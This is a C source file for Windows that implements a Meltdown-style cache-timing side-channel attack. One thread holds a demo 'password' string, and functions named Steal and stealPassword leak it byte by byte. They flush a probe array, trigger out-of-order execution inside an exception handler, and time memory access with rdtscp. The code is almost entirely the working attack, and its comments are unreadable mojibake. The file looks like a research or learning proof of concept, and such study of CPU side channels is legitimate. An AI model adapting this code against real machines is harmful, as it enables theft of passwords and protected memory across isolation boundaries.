#include <stdio.h>
#include <intrin.h>
#include <excpt.h>
#include <stdint.h>
#include <locale.h>
#include <Windows.h>
#include <stdlib.h>  

#define NUM_READS 100  //�ܺ����߳�������ȡ���������
#define PROCESSOR_AFFINITY_CORE0 1 // �����һ��CPU���ĵ�������1  


uint8_t probe_array[256][4096];
uint64_t access_time[256];

void OutOfOrderExecution(void* target, void* probe_array, void* null);//��ຯ����ʵ�־�ȷ����

// ȫ�ֱ����洢����  
uint64_t secret_address;//64λ����ϵͳ��ָ���СΪ8�ֽ�64λ�޷�������

uint8_t Steal(uint8_t* target)
{
    for (size_t retries = 0; retries < 30000; retries++)
    {
        for (size_t i = 0; i < 256; i++)
        {
            _mm_clflush(&probe_array[i]);
            _mm_pause();
        }

        __try
        {
            OutOfOrderExecution(target, probe_array, NULL);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}

        for (size_t i = 0; i < 256; i++)
        {
            uint32_t aux = 0;
            uint64_t a = __rdtscp(&aux);
            probe_array[i][0]++;
            uint64_t b = __rdtscp(&aux);
            access_time[i] = b - a;
        }

        size_t idx_min = 0;
        for (size_t i = 0; i < 256; i++)
        {
            if (access_time[i] < access_time[idx_min]) idx_min = i;
            _mm_pause();
        }

        if (access_time[idx_min] < 100 && idx_min != 0)
        {
            printf(" => %02X retries=%-5zd access_time=%llu\n"
                , (uint32_t)idx_min
                , retries
                , access_time[idx_min]
            );
            return (uint8_t)idx_min;
        }

        _mm_pause();
    }

    printf(" => 00\n");
    return 0;
}

// ��ȡ��������̺߳���  
DWORD WINAPI readPassword(LPVOID lpParam) {
    //�̶���1��cpu����������
    if (!SetThreadAffinityMask(GetCurrentThread(), PROCESSOR_AFFINITY_CORE0)) {
        wprintf(L"Error setting thread affinity mask: %lu\n", GetLastError());
    }
    uint64_t* p_secret_address = (uint64_t*)lpParam;
    char secret[20] = "hello_world!";
    *p_secret_address = &secret;
    printf("read_address : %p\n", *p_secret_address);
    int i;
    for (i = 0; i < NUM_READS; i++) {

        Sleep(500);
        // ��ȡ����  
        char* temp = secret;
    }
    return 0;
}

//�����������ַ��������ִ�л�ȡ����Ĺ������̡߳�
DWORD WINAPI stealPassword(LPVOID lpParam) {
    //�̶���1��cpu����������
    if (!SetThreadAffinityMask(GetCurrentThread(), PROCESSOR_AFFINITY_CORE0)) {
        wprintf(L"Error setting thread affinity mask: %lu\n", GetLastError());
    }
    uint64_t* target = (uint64_t*)lpParam;
    printf("stealing target address: %p\n", *target);
    uint8_t buffer[32] = { 0 };

    for (size_t i = 0; i < sizeof(buffer); i++)
    {
        printf("Steal#%-2zd", i);
        buffer[i] = Steal(*target + i);
    }

    for (size_t i = 0; i < sizeof(buffer); i++)
        putchar(buffer[i]);

    putchar('\n');

    return 0;
}

int main(int argc, char* argv[])
{
    HANDLE Thread_1, Thread_2;
    DWORD dwThreadId_1, dwThreadId_2;
    Thread_1 = CreateThread(NULL, 0, readPassword, (LPVOID)&secret_address, 0, &dwThreadId_1);
    if (Thread_1 == NULL) {
        fprintf(stderr, "Error creating thread: %lu\n", GetLastError());
        return 1;
    }
    Sleep(500);//���߳�1����˽�б�����ַ��
    Thread_2 = CreateThread(NULL, 0, stealPassword, (LPVOID)&secret_address, 0, &dwThreadId_2);
    if (Thread_2 == NULL) {
        fprintf(stderr, "Error creating thread: %lu\n", GetLastError());
        return 1;
    }
    WaitForSingleObject(Thread_2, INFINITE);//�ȴ��߳�2����

    CloseHandle(Thread_1);
    CloseHandle(Thread_2);

    return 0;
}